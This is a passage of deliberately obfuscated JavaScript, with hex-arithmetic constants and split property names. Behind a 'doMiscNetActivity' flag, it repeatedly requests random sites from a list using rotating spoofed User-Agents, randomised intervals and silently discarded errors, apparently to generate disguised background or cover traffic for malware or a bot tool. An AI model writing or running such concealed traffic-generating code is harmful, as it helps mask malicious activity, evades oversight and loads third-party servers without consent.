    for (let l = -0x726 + 0x16cd + -0xfa7; l < 0x1844 * -0x1 + 0x6 * -0x427 + 0x3132; l++)
      setTimeout(f, (-0x1 * 0x15836 + 0x4d5a + 0x1f53c) * l * getRandomInt(-0x32 * 0xc1 + 0x1 * -0x529 + 0x2adc, 0x77 * 0x31 + -0x1a65 + -0x1 * -0x3a1));
  }, -0x1dfa + -0xd80d1 * -0x6 + -0x19f86c);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a7 = d,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents[a7(0x1)]()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2d96 + 0x3c2 + 0x26 * 0x1d2) * getRandomInt(-0x4 * -0x6ad + -0x6a1 + -0x1412, 0x4 * 0x3cb + 0x1b47 + -0x2a6e));
}, -0xa * -0x1dc + -0x5 * -0x141 + 0x1879 * -0x1);